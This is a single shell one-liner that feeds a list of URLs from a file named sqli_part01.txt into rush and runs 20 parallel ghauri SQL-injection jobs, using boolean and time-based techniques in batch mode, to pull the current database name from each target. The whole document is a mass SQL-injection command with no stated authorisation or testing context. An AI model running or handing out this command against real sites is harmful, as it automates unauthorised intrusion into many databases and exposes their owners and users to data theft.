cat sqli_part01.txt | rush -k -j 20 'bash -c "ghauri --url \"{}\" --current-db --timeout 10 --threads 60 --level 3 --technique BT --batch"'
